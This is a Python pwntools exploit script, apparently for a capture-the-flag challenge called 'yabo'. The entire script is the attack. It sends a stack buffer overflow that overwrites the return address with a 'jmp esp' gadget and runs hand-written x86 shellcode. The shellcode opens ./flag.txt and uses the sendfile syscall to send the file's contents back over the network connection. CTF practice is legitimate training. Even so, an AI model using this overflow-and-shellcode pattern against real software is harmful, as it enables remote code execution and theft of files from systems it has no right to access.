#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./yabo')

if args.REMOTE:
	p = remote('challenge.ctf.games', 32332)
else:
	p = remote('127.0.0.1', 9999)

arg0 = b'./flag.txt'

shellcode = asm(f'''

/* open flag.txt */

xor eax, eax											# eax = 0
xor ecx, ecx											# ecx = 0
xor edx, edx											# edx = 0
mov ebx, {'-0x' + hexlify(arg0[8:][::-1]).decode()}		# because of nulls set a neg, then use neg, then push to stack
neg ebx
push ebx
push {'0x' + hexlify(arg0[4:8][::-1]).decode()} 		# rest of filename
push {'0x' + hexlify(arg0[0:4][::-1]).decode()}
mov ebx, esp											# ebx points to ./flag.txt
mov al, {constants.SYS_open}							# open file, eax will have FD for open file
int 0x80

/* use sendfile to, well, send the file */

mov ecx, eax											# mv open FD to ecx
dec eax													# fd from open
mov ebx, eax											# now fd of accept
push 50													# length of flag?
pop esi
xor edx, edx											# zero edx, may not been required since done above and not used
xor eax, eax											# eax = 0
mov al, 187												# sendfile syscall (was not in pwn tools table)
int 0x80
''')

log.info('len(shellcode): ' + str(len(shellcode)))

jmp_esp = next(binary.search(asm('jmp esp')))

payload  = b''
payload += 0x414 * b'A'
payload += p32(jmp_esp)
payload += shellcode

if payload.find(b'\0') != -1:
	log.critical('NULL in payload, exiting!')
	print(disasm(shellcode))
	sys.exit(1)

p.sendlineafter(b'say?: ',payload)
p.stream()

